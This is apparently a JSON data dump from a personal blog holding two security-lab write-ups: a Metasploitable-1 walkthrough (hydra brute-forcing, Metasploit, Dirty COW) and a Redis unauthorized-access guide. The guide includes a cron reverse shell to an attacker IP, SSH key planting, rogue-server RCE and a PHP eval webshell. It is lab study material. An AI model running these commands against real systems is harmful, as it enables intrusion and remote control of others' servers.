.png&quot;],[0,&quot;img/1675329659408.png&quot;],[0,&quot;img/1675329715883.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/8&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/metasploitable-1&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-1&quot;],&quot;date&quot;:[3,&quot;2023-02-01T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;&lt;!-- more --&gt;\n\n&gt;参考教程：\n&lt;https://hack1ng4fun.github.io/2020/03/26/%E9%9D%B6%E6%9C%BA-Metasploitable-1/&gt;\n\n&lt;!-- more --&gt;\n\n扫描端口结果：\nsudo nmap -sV -Pn -T4 -p 1-65535 -O 192.168.124.28\n\n&lt;!-- more --&gt;\n# 方法1：SMB漏洞进入\n查看smb版本:\n```\nsmbmap -H 192.168.124.28\n ```\nget the version of smb: 3.0.20,we have known that smb-3.0.x has a vulnerablity (CVE-2007-2447）.\nThen we can use msf to exploit it.\n \nit&#39;s root privilege.\n\n&lt;!-- more --&gt;\n\n# 方法2：Weak password(FAIL)\nUse smb_enumusers to scan users,then arrage result to file \&quot;users\&quot;\nmy smb_enumusers didn&#39;t return unexpected result. the result is as follows:\n \nUnfortunately,I failed,I don&#39;t know why.I expected future of me to tell myself.\nbrust user of ftp,telnet,ssh,smb,MySQL,PostgreSQL\n```\nhydra -L users -e nsr ftp://192.168.124.28 -o ftpuser\nhydra -L users -e nsr ssh://192.168.124.28 -o sshuser\nhydra -L users -e nsr telnet://192.168.124.28 -o telnetuser\nhydra -L users -e nsr smb://192.168.124.28 -o smbuser\nhydra -L users -e nsr mysql://192.168.124.28 -o mysqluser\nhydra -L users -e nsr postgres://192.168.124.28 -o postgresqluser\n```\n\&quot;-e nsr\&quot; means try \&quot;n\&quot; null password\nuser msfadmin has root privilege.\nsudo -i  change to root user.\n\n&lt;!-- more --&gt;\n\n# Method 3:（CVE-2004-2687）\nThere is a weak passwd:root/root in mysql\n \nUse nmap for vulnerability scanning:\nnmap --script vuln 192.168.124.28 -p- open\nThe screenshot is as follows:(the picture is so big that I can&#39;t paste it )\n📎扫描结果.txt\nWe find a vulnerability CVE-2004-2687\n \nUse msf to exploit it,unfortunately,I failed again.I don&#39;t know why.\n \nExploit failed: A payload has not been selected\n \n \nNext is escalating privilege.\nCheck scheduled tasks:\n \nAll scripts are running with root privilege and have no \&quot;write\&quot; privilege.\nFor convenience,I transform shell to \&quot;meterpreter shell\&quot;\n \nUse kernel vulnerability to escalate privilege.\nI am counting on \&quot;dirty-cow\&quot; .\nupload /home/kali/Desktop/dirty.c /var/spool/cron\n ```\nshell\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n ```\nThen I get an account \&quot;firefart:fly\&quot;\n\n&lt;!-- more --&gt;\n\n# Method 4:\nThe target&#39;s port 80 is open,scan its directory\n```\ndirb http://192.168.124.28 /usr/share/wordlists/dirb/big.txt\n```\nfind a url : http://192.168.124.28/tikiwiki/\ntry admin:admin to login(I have change password from admin to 123456 now)\nUse msf to exploit it again\n \n \nIt&#39;s account:\&quot;ww-data\&quot;\nUse CVE-2009-1185 to escalate privilege.\n \n \nNow,it&#39;s accont \&quot;firefart&#39;,because I have used dirty-cow in method3\n\n&lt;!-- more --&gt;\n\n# Method 5:\nI have find port 8180 in nmap result,\nIt&#39;s a website based on tomcat.Login it depend on weak password \&quot;tomcat:tomcat\&quot;\n \nsearchsploit it...\nCan deploy war to getshell.For convenience ,use msf\n \n \nit&#39;s account \&quot; tomcat55\&quot;.Need privilege escalation.\nfind authoized_keys in /root/.ssh/ ,it&#39;s target&#39;s public key.\nAfter checking, it is found that the OpenSSL version on the target host is within the vulnerability range.\n \nDownload key pairs on the internet,\nuse &#39;grep&#39; command to find the matching public key file\nRemove the suffix name of the public key file to create the corresponding private key file.\n \nUse this private key file to log in to the root user of the target host.&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Metasploitable-1.md&quot;],&quot;digest&quot;:[0,&quot;ed7278b216cd4742&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;!-- more --&gt;\n&lt;blockquote&gt;\n&lt;p&gt;参考教程：\n&lt;a href=\&quot;https://hack1ng4fun.github.io/2020/03/26/%E9%9D%B6%E6%9C%BA-Metasploitable-1/\&quot;&gt;https://hack1ng4fun.github.io/2020/03/26/%E9%9D%B6%E6%9C%BA-Metasploitable-1/&lt;/a&gt;&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;扫描端口结果：\nsudo nmap -sV -Pn -T4 -p 1-65535 -O 192.168.124.28&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;方法1smb漏洞进入\&quot;&gt;方法1：SMB漏洞进入&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法1smb漏洞进入\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;查看smb版本:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbmap -H 192.168.124.28&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;get the version of smb: 3.0.20,we have known that smb-3.0.x has a vulnerablity (CVE-2007-2447）.\nThen we can use msf to exploit it.&lt;/p&gt;\n&lt;p&gt;it’s root privilege.&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;方法2weak-passwordfail\&quot;&gt;方法2：Weak password(FAIL)&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法2weak-passwordfail\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use smb_enumusers to scan users,then arrage result to file “users”\nmy smb_enumusers didn’t return unexpected result. the result is as follows:&lt;/p&gt;\n&lt;p&gt;Unfortunately,I failed,I don’t know why.I expected future of me to tell myself.\nbrust user of ftp,telnet,ssh,smb,MySQL,PostgreSQL&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr ftp://192.168.124.28 -o ftpuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr ssh://192.168.124.28 -o sshuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr telnet://192.168.124.28 -o telnetuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr smb://192.168.124.28 -o smbuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr mysql://192.168.124.28 -o mysqluser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr postgres://192.168.124.28 -o postgresqluser&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;“-e nsr” means try “n” null password\nuser msfadmin has root privilege.\nsudo -i  change to root user.&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;method-3cve-2004-2687\&quot;&gt;Method 3:（CVE-2004-2687）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-3cve-2004-2687\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;There is a weak passwd:root/root in mysql&lt;/p&gt;\n&lt;p&gt;Use nmap for vulnerability scanning:\nnmap —script vuln 192.168.124.28 -p- open\nThe screenshot is as follows:(the picture is so big that I can’t paste it )\n📎扫描结果.txt\nWe find a vulnerability CVE-2004-2687&lt;/p&gt;\n&lt;p&gt;Use msf to exploit it,unfortunately,I failed again.I don’t know why.&lt;/p&gt;\n&lt;p&gt;Exploit failed: A payload has not been selected&lt;/p&gt;\n&lt;p&gt;Next is escalating privilege.\nCheck scheduled tasks:&lt;/p&gt;\n&lt;p&gt;All scripts are running with root privilege and have no “write” privilege.\nFor convenience,I transform shell to “meterpreter shell”&lt;/p&gt;\n&lt;p&gt;Use kernel vulnerability to escalate privilege.\nI am counting on “dirty-cow” .\nupload /home/kali/Desktop/dirty.c /var/spool/cron&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then I get an account “firefart:fly”&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;method-4\&quot;&gt;Method 4:&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-4\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;The target’s port 80 is open,scan its directory&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.28 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;find a url : &lt;a href=\&quot;http://192.168.124.28/tikiwiki/\&quot;&gt;http://192.168.124.28/tikiwiki/&lt;/a&gt;\ntry admin:admin to login(I have change password from admin to 123456 now)\nUse msf to exploit it again&lt;/p&gt;\n&lt;p&gt;It’s account:“ww-data”\nUse CVE-2009-1185 to escalate privilege.&lt;/p&gt;\n&lt;p&gt;Now,it’s accont “firefart’,because I have used dirty-cow in method3&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;method-5\&quot;&gt;Method 5:&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-5\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;I have find port 8180 in nmap result,\nIt’s a website based on tomcat.Login it depend on weak password “tomcat:tomcat”&lt;/p&gt;\n&lt;p&gt;searchsploit it…\nCan deploy war to getshell.For convenience ,use msf&lt;/p&gt;\n&lt;p&gt;it’s account ” tomcat55”.Need privilege escalation.\nfind authoized_keys in /root/.ssh/ ,it’s target’s public key.\nAfter checking, it is found that the OpenSSL version on the target host is within the vulnerability range.&lt;/p&gt;\n&lt;p&gt;Download key pairs on the internet,\nuse ‘grep’ command to find the matching public key file\nRemove the suffix name of the public key file to create the corresponding private key file.&lt;/p&gt;\n&lt;p&gt;Use this private key file to log in to the root user of the target host.&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;方法1smb漏洞进入&quot;],&quot;text&quot;:[0,&quot;方法1：SMB漏洞进入&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;方法2weak-passwordfail&quot;],&quot;text&quot;:[0,&quot;方法2：Weak password(FAIL)&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-3cve-2004-2687&quot;],&quot;text&quot;:[0,&quot;Method 3:（CVE-2004-2687）&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-4&quot;],&quot;text&quot;:[0,&quot;Method 4:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-5&quot;],&quot;text&quot;:[0,&quot;Method 5:&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-1&quot;],&quot;date&quot;:[3,&quot;2023-02-01T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/4&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/redis未授权访问&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Redis未授权访问&quot;],&quot;date&quot;:[3,&quot;2023-01-18T18:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;未授权访问&quot;],[0,&quot;Redis&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;[toc]\n\n# 计划任务反弹shell（仅适用于centos）\n如果没有redis-cli,可以用telnet\n在redis以root权限运行时可以写crontab来执行命令反弹shell\nVPS上：\n\n```shell\nnc -lvnp 7999 \n\nredis-cli -h 192.168.124.5\nset xx \&quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.124.4/7999 0&gt;&amp;1\\n\&quot;\nconfig set dir /var/spool/cron/\nconfig set dbfilename root\nsave\n```\n\nvulhub的docker靶机未开crontab服务，所以该方法不适用\n\n补充：redis工具安装\n\n```shell\nwget http://download.redis.io/redis-stable.tar.gz\ntar -zxf redis-stable.tar.gz\n# 进入到 redis-stable 目录\ncd redis-stable\n# 编译\nmake\ncp ./src/redis-cli /usr/bin/\nredis-cli -h\n```\n\n注意任务计划反弹shell方法仅适用于Centos\n\nUbuntu 不能用的原因如下：\n\n因为默认 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件 /var/spool/cron/crontabs/&amp;lt;username&amp;gt; 权限必须是 600 才会执行，否则会报错 (root) INSECURE MODE (mode 0600 expected)，而 Centos 的定时任务文件 /var/spool/cron/&amp;lt;username&amp;gt; 权限 644 也可以执行  \n因为 redis 保存 RDB 会存在乱码，在 Ubuntu 上会报错，而在 Centos 上不会报错  \n由于系统的不同，crontrab 定时文件位置也不同：\n\nCentos 的定时任务文件在 /var/spool/cron/&amp;lt;username&amp;gt;  \nUbuntu 的定时任务文件在 /var/spool/cron/crontabs/&amp;lt;username&amp;gt;\n\n# ssh-key公钥登录服务器\n\n在攻击方生成一对ssh key\n\n`ssh-keygen -t rsa`\n\n将生成的公钥植入目标服务器\n\n```shell\n(echo -e \&quot;\\n\\n\&quot;; cat ~/.ssh/id_rsa.pub; echo -e \&quot;\\n\\n\&quot;) &gt; /tmp/foo.txt\ncat /tmp/foo.txt | redis-cli -h 192.168.124.5 -p 6379 -x set crackit\n```\n\n连接目标,设置redis配置文件\n\n```shell\nredis-cli -h 192.168.124.5\nconfig set dir /root/.ssh/\nconfig get dir\nconfig set dbfilename \&quot;authorized_keys\&quot;\nsave\n```\n\n利用私钥连接目标\n\n`ssh root@192.168.124.5 -i ~/.ssh/id_rsa`\n\n不适用于vulhub靶场\n\n# 利用主从复制rce\n\n## 方法一：利用脚本\n\n&gt; https://github.com/n0b0dyCN/redis-rogue-server\n\n```shell\nnc -lvvp 9999\n./redis-rogue-server.py --rhost 192.168.124.5 --lhost 192.168.124.4\n```\n\n后面选反弹shell\n\n![](img/25.PNG)\n## 方法二：手动执行(操作失败)脚本文件\n\n```shell\nredis-cli -h 192.168.124.5\n&gt; ping\n&gt; config set dir ./ # 设置redis的备份路径为当前目录\n&gt; config set dbfilename exp.so # 设置备份文件名为exp.so，默认为dump.rdb\n&gt; slaveof 192.168.10.1 9999 # 设置主服务器IP和端口\n&gt; module load ./exp.so # 加载恶意模块\n&gt; slaveof no one # 切断主从，关闭复制功能\n&gt; system.exec &#39;whoami&#39; # 执行系统命令\n&gt; config set dbfilename dump.rdb # 通过dump.rdb文件恢复数据\n&gt; system.exec &#39;rm ./exp.so&#39; # 删除exp.so\n&gt; module unload system # 卸载system模块的加载\n```\n\n# redis写webshell\n\n靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）\n\n这里由于本地搭建，我们已经知道目录，我们把shell写入/home/bmjoker/目录下：\n\n```shell\nconfig set dir /home/bmjoker\nconfig set dbfilename redis.php\nset x \&quot;\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n\&quot;\nsave\n```\n\n当数据库过大时，redis写shell的小技巧：\n\n```php\n&lt;?php set_time_limit(0); $fp=fopen(&#39;bmjoker.php&#39;,&#39;w&#39;); fwrite($fp,&#39;&lt;?php @eval($_POST[\\\&quot;bmjoker\\\&quot;]);?&gt;&#39;); exit(); ?&gt;\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Redis未授权访问.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/25.PNG&quot;]]],&quot;digest&quot;:[0,&quot;2aca5d24f9f8eb23&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;p&gt;[toc]&lt;/p&gt;\n&lt;h1 id=\&quot;计划任务反弹shell仅适用于centos\&quot;&gt;计划任务反弹shell（仅适用于centos）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#计划任务反弹shell仅适用于centos\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;如果没有redis-cli,可以用telnet\n在redis以root权限运行时可以写crontab来执行命令反弹shell\nVPS上：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;nc&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -lvnp&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; 7999 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; xx&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\n* * * * * bash -i &gt;&amp;#x26; /dev/tcp/192.168.124.4/7999 0&gt;&amp;#x26;1\\n\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /var/spool/cron/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dbfilename&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;save&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;vulhub的docker靶机未开crontab服务，所以该方法不适用&lt;/p&gt;\n&lt;p&gt;补充：redis工具安装&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;wget&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;tar&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -zxf&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; redis-stable.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 进入到 redis-stable 目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;cd&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; redis-stable&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 编译&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;make&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;cp&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; ./src/redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /usr/bin/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;注意任务计划反弹shell方法仅适用于Centos&lt;/p&gt;\n&lt;p&gt;Ubuntu 不能用的原因如下：&lt;/p&gt;\n&lt;p&gt;因为默认 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件 /var/spool/cron/crontabs/&amp;#x3C;username&gt; 权限必须是 600 才会执行，否则会报错 (root) INSECURE MODE (mode 0600 expected)，而 Centos 的定时任务文件 /var/spool/cron/&amp;#x3C;username&gt; 权限 644 也可以执行&lt;br&gt;\n因为 redis 保存 RDB 会存在乱码，在 Ubuntu 上会报错，而在 Centos 上不会报错&lt;br&gt;\n由于系统的不同，crontrab 定时文件位置也不同：&lt;/p&gt;\n&lt;p&gt;Centos 的定时任务文件在 /var/spool/cron/&amp;#x3C;username&gt;&lt;br&gt;\nUbuntu 的定时任务文件在 /var/spool/cron/crontabs/&amp;#x3C;username&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ssh-key公钥登录服务器\&quot;&gt;ssh-key公钥登录服务器&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssh-key公钥登录服务器\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在攻击方生成一对ssh key&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;ssh-keygen -t rsa&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;将生成的公钥植入目标服务器&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;echo&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -e&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\n\\n\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;; &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;cat&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; ~/.ssh/id_rsa.pub&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;; &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;echo&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -e&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\n\\n\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; /tmp/foo.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;cat&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /tmp/foo.txt&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; |&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -p&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 6379&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -x&lt;/span&gt;&lt;span 